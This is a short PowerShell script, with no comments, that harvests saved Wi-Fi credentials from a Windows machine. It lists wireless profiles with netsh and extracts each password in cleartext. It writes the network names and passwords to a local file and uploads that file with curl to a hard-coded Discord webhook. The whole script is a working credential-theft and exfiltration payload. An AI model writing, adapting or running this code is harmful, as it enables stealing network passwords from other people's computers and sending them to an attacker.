
$webhookUrl  = 'https://discord.com/api/webhooks/1168997833945403443/b9KVbM7c72rekuk8um12U5Uz_9Elu_tz5aLeFKgzYBpK4MSQepewl3iDPtt4RrMGV3oG'

$networks = netsh wlan show profiles
$begin = [array]::indexof($networks,"User profiles") + 2
$end = $networks.Length - 2
$names = @()


for($i = $begin; $i -le $end; $i++)
{
	$names += $networks[$i].substring($networks[$i].IndexOf(': ') + 2)
}


foreach($network in $names)
{
	$profile = netsh wlan show profile name=$network key=clear
	$name = ""
	$pass = ""
	$combo = ""
	foreach($line in $profile)
	{
		if($line.IndexOf('Key Content') -ne -1)
		{
			$pass = $line.substring($line.IndexOf(': ') + 2)
		}
		elseif($line.IndexOf('SSID name') -ne -1)
		{
			$name = $line.substring($line.IndexOf(':') + 2).Trim('"')
		}
	}
	if($pass -eq "")
	{
		$pass = "Not Available"
	}
	$combo = $name + " - " + $pass
	add-content -value $combo -path ".\wifi.txt"
}
$file = Join-Path -Path $PWD -ChildPath "wifi.txt"
curl.exe -F "file1=@$file" $webhookURL
EXIT
